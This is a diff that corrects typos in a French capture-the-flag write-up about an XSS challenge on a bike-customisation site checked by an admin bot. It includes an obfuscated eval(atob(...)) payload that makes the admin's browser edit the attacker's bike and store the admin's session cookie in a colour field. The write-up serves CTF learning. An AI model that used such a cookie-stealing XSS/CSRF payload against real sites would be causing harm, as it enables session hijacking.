@@ -8,13 +8,13 @@ Comme bien souvent dans les ctf quand il y a un bot dans le backend qui vérifie
 
 > XSS, bah tranquil dans 15/20 min c'est flag
 
-Je n'étais pas au bout de mes surprise.
+Je n'étais pas au bout de mes surprises.
 
 Commençons par tenter une XSS à la place d'une couleur dans notre vélo car c'est le seul élément réflected.
 
 ![alert](alert.png)
 
-> Bingo ! c'est bon, une redirection, et c'est flag
+> Bingo ! c'est bon, une redirection, c'est flag dans 5 minutes
 
 ![triggeralert](triggeralert.png)
 
@@ -26,7 +26,7 @@ Le chall devient intéréssant.
 
 Sans réfléchir et pendant 30 minutes, j'ai cherché des payloads XSS pour palier ce soucis. Mais comment stocké un cookie sur ce site que nous ne contrôlons pas.
 
-Après réflexions nous avons la possibilité de créer des svg pour des styles de vélo donc pourquoi pas faire crée un vélo à l'admin ... encore mieux pourquoi pas lui faire modifier un vélo que j'ai créé. Bien évidement il nous déposera gentillement son cookie à la place de la couleur.
+Après réflexions nous avons la possibilité de créer des svg pour des styles de vélo donc pourquoi pas faire créer un vélo à l'admin ... encore mieux pourquoi pas lui faire modifier un vélo que j'ai créé. Bien évidement il nous déposera gentillement son cookie à la place de la couleur.
 
 J'ai donc créé ma payload CSRF. 
 
@@ -43,8 +43,8 @@ payload final :
 eval(atob("dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4aHIub3BlbigiUE9TVCIsICIvP3BhZ2U9cHJldmlldyZhY3Rpb249ZWRpdEJpa2UmaWQ9MzQxIik7Cnhoci5zZXRSZXF1ZXN0SGVhZGVyKCdDb250ZW50LXR5cGUnLCAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJyk7Cnhoci5zZW5kKCJkYXRhPSU1QiU3QiUyMmlkJTIyJTNBJTIycm91ZTAlMjIlMkMlMjJzbG90JTIyJTNBMCUyQyUyMmNvbG9ycyUyMiUzQSU1QiUyMiU1QyUyMiUzRSUyNSIrZG9jdW1lbnQuY29va2llKyIlMjNlNTM5MzUlMjIlMkMlMjIlMjNmYjhjMDAlMjIlNUQlN0QlMkMlN0IlMjJpZCUyMiUzQSUyMnJvdWUwJTIyJTJDJTIyc2xvdCUyMiUzQTElMkMlMjJjb2xvcnMlMjIlM0ElNUIlMjIlMjMxZTg4ZTUlMjIlMkMlMjIlMjM4ZTI0YWElMjIlNUQlN0QlMkMlN0IlMjJpZCUyMiUzQSUyMmd1aWRvbjIlMjIlMkMlMjJzbG90JTIyJTNBMiUyQyUyMmNvbG9ycyUyMiUzQSU1QiUyMiUyMzViY2ZmYSUyMiUyQyUyMiUyM2Y1YWJiOSUyMiU1RCU3RCUyQyU3QiUyMmlkJTIyJTNBJTIyc2VsbGUxJTIyJTJDJTIyc2xvdCUyMiUzQTMlMkMlMjJjb2xvcnMlMjIlM0ElNUIlMjIlMjM0M2EwNDclMjIlNUQlN0QlMkMlN0IlMjJpZCUyMiUzQSUyMmNhZHJlMyUyMiUyQyUyMnNsb3QlMjIlM0E0JTJDJTIyY29sb3JzJTIyJTNBJTVCJTIyJTIzZmRkODM1JTIyJTVEJTdEJTVEIik7"))
 ```
 
-Plus qu'a envoyer le vélo en vérification auprès de l'admin.
-Il à bien modifier le vélo avec son cookie.
+Plus qu'à envoyer le vélo en vérification auprès de l'admin.
+Il a bien modifier le vélo avec son cookie.
 
 ![cookie](cookie.png)
 
